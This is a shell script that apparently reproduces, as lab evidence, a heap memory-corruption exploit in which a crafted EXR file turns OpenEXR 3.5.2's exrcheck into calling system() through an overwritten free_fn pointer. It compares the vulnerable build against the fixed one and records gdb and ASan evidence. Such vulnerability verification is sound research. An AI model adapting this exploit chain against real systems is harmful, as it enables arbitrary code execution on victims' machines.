#!/bin/sh
# W202: one-command replay.  A crafted EXR makes the UNMODIFIED pinned 3.5.2
# exrcheck call memcpy(ctxt, file-chosen src, 104) at opaque.c:79, overwrite
# ctxt->free_fn with libc system, and run system("touch /tmp/w202m") from
# attributes.c:271 under ASLR OFF (setarch -R, no debugger in the controls).
# The fixed 3.5.3 build and the valid baseline create no marker.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p evidence

for spec in \
    'cases/p202-memcpy-system.exr 7f3eda1b00f54b56ec75108f9012be6b035c8b6393ec1d7c2241f94be91e412e' \
    'cases/make_w202_poc.py f884e414c180bde4bb036547e65a8c5b95b269f141afb1b98a3764f6bed43402' \
    'cases/w195-pre-copy2-dump.bin f7c32f6ad820de0532396426d0ad9a8aa58440071636b03e1592cf766daffdc0' \
    'harness/w202-command.cmd 2ea315718753d90adc2a4d398a939d9ccd47a5e77b063ae33a191ff2b2cf12bc'
do
    set -- $spec
    test "$(sha256sum "$1" | cut -d' ' -f1)" = "$2"
done

MARKER=/tmp/w202m
RAW=$(mktemp)
trap 'rm -f "$RAW" "$MARKER"' EXIT

# Chain observation under gdb, ASLR off.  The debugger sets no pointer and
# forces no call; it only stops at the file-chosen target and at system.
rm -f "$MARKER"
gdb -q -batch -ex 'set args -c cases/p202-memcpy-system.exr' \
    -x harness/w202-command.cmd ./build-vuln-plain/bin/exrcheck \
    > "$RAW" 2>&1 || true
grep -q '^CTXT=0x555555826f00 FREEFN_BEFORE=0x[0-9a-f]* UNP=0x555555828618 SZ=104 TARGET=0x7ffff7feb900$' "$RAW"
grep -q '^MEMCPY_RDI=0x555555826f00 RSI=0x555555828618 RDX=104 SRC_FREEFN=0x7ffff7658750$' "$RAW"
grep -q '^SYSTEM_RDI=0x555555828520$' "$RAW"
grep -q '^0x555555826f60:.*0x00007ffff7658750' "$RAW"
grep -q 'touch /tmp/w202m' "$RAW"
grep -q 'Detaching after vfork from child process' "$RAW"
test -f "$MARKER"
{
    echo 'ASLR=off (gdb set disable-randomization on)'
    grep -o 'CTXT=0x[0-9a-f]* FREEFN_BEFORE=0x[0-9a-f]* UNP=0x[0-9a-f]* SZ=104 TARGET=0x[0-9a-f]*' "$RAW"
    grep -o 'MEMCPY_RDI=0x[0-9a-f]* RSI=0x[0-9a-f]* RDX=104 SRC_FREEFN=0x[0-9a-f]*' "$RAW"
    grep -o 'SYSTEM_RDI=0x[0-9a-f]*' "$RAW"
    grep -o '0x555555826f60:.*0x00007ffff7658750' "$RAW"
    grep -o 'touch /tmp/w202m' "$RAW"
    grep -o 'Detaching after vfork from child process' "$RAW"
    grep -o 'opaque.c:79' "$RAW"
    grep -o 'memmove-vec-unaligned-erms.S' "$RAW"
} > evidence/w202-chain.out

# Plain unmodified binaries, ASLR off via setarch -R, no debugger attached.
rm -f "$MARKER"
setarch "$(uname -m)" -R ./build-vuln-plain/bin/exrcheck -c \
    cases/p202-memcpy-system.exr > "$RAW" 2>&1 || vuln_rc=$?
vuln_rc=${vuln_rc:-0}
test -f "$MARKER"
printf 'MARKER_PRESENT=%s rc=%s\n' "$(sha256sum "$MARKER" | cut -d' ' -f1)" "$vuln_rc" \
    > evidence/w202-vuln.out

rm -f "$MARKER"
setarch "$(uname -m)" -R ./build-fixed-plain/bin/exrcheck -c \
    cases/p202-memcpy-system.exr > "$RAW" 2>&1 || fixed_rc=$?
fixed_rc=${fixed_rc:-0}
test ! -f "$MARKER"
grep -q 'bad' "$RAW"
printf 'MARKER_ABSENT fixed_rc=%s bad=1\n' "$fixed_rc" > evidence/w202-fixed.out

rm -f "$MARKER"
setarch "$(uname -m)" -R ./build-vuln-plain/bin/exrcheck -c \
    cases/baseline.exr > "$RAW" 2>&1 || safe_rc=$?
safe_rc=${safe_rc:-0}
test ! -f "$MARKER"
grep -q 'OK' "$RAW"
printf 'MARKER_ABSENT safe_rc=%s ok=1\n' "$safe_rc" > evidence/w202-safe.out

# ASan confirms the same pinned sink is the source of the overwrite.
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:log_path=stderr \
    ./build-vuln-asan/bin/exrcheck -c cases/p202-memcpy-system.exr \
    > "$RAW" 2>&1 || asan_rc=$?
asan_rc=${asan_rc:-0}
awk '
    { gsub(/==[0-9]+==/, "==PID==") }
    { gsub(/BuildId: [0-9a-f]+/, "BuildId: ID") }
    { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell\/lab\/openexr2shell-real/, "LAB") }
    { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell/, "SITE") }
    { gsub(/0x[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]*/, "ADDR") }
    { print }
' < "$RAW" > evidence/w202-asan.out
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' evidence/w202-asan.out
grep -q 'READ of size 3072' evidence/w202-asan.out
grep -q 'internal_zstd.c:472' evidence/w202-asan.out

printf 'RESULT PASS\n'
sha256sum evidence/w202-*.out
